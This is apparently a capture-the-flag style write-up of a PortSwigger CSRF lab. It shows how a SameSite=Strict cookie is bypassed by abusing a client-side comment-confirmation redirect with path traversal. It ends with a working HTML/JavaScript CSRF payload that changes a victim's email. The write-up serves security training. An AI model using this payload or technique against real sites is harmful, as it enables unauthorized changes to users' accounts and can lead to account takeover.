---
layout: post
title: "SameSite Strict bypass via client-side redirect"
date: 2026-10-17
description: "PortSwigger CSRF lab bypassing SameSite=Strict through a client-side redirect and path traversal."
series: PortSwigger CSRF
categories:
  - CTF
  - PortSwigger
tags:
  - CSRF
  - Web
---

## Description

This [lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect){:target="_blank"}'s change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: `wiener:peter`

## Steps

Logging in to see the cookie:

```http
POST /login HTTP/2
Host: 0a2600f103f51eef82edb1ef00060062.web-security-academy.net
Cookie: session=XgVysSQiGVXtem7kfTzX7aoDYLMojLKA
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a2600f103f51eef82edb1ef00060062.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2600f103f51eef82edb1ef00060062.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i

username=wiener&password=peter
```

The response:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=Rl9TafivxxJQVN9mLJetPsJ3C3eOgwQC; Secure; HttpOnly; SameSite=Strict
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

We can see it is:

- `Secure`: HTTPS only.
- `HttpOnly`: not accessible from JavaScript, which protects against XSS.
- `SameSite=Strict`: the most secure attribute, browsers will not send it in any cross-site requests.

We also notice that the CSRF token is missing when updating our email, so the site is vulnerable to CSRF if we can bypass the `Strict` attribute.

Our target now is to find another bug in the site that we can leverage to bypass the `Strict` attribute.

We notice that there's a blog and it allows us to post comments:

```http
POST /post/comment HTTP/2
Host: 0a2600f103f51eef82edb1ef00060062.web-security-academy.net
Cookie: session=Rl9TafivxxJQVN9mLJetPsJ3C3eOgwQC
Content-Length: 66
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a2600f103f51eef82edb1ef00060062.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2600f103f51eef82edb1ef00060062.web-security-academy.net/post/10
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i

postId=10&comment=test&name=test&email=test%40example.com&website=
```

And then we're able to get the comment via:

```http
GET /post/comment/confirmation?postId=10 HTTP/2
Host: 0a2600f103f51eef82edb1ef00060062.web-security-academy.net
Cookie: session=Rl9TafivxxJQVN9mLJetPsJ3C3eOgwQC
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a2600f103f51eef82edb1ef00060062.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2600f103f51eef82edb1ef00060062.web-security-academy.net/post/comment
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i
```

We notice a JS file responsible for the redirection after submitting a comment:

`https://0a2600f103f51eef82edb1ef00060062.web-security-academy.net/resources/js/commentConfirmationRedirect.js`

```js
redirectOnConfirmation = (blogPath) => {
  setTimeout(() => {
    const url = new URL(window.location);
    const postId = url.searchParams.get("postId");
    window.location = blogPath + '/' + postId;
  }, 3000);
}
```

We can notice that the `postId` is being added to the URL, opening the way for us to do directory traversal and change the email address:

```html
<h1>Lab 08</h1>

<script>
document.location="https://0a2600f103f51eef82edb1ef00060062.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=testtttttt%40test.ca%26submit=1";
</script>
```
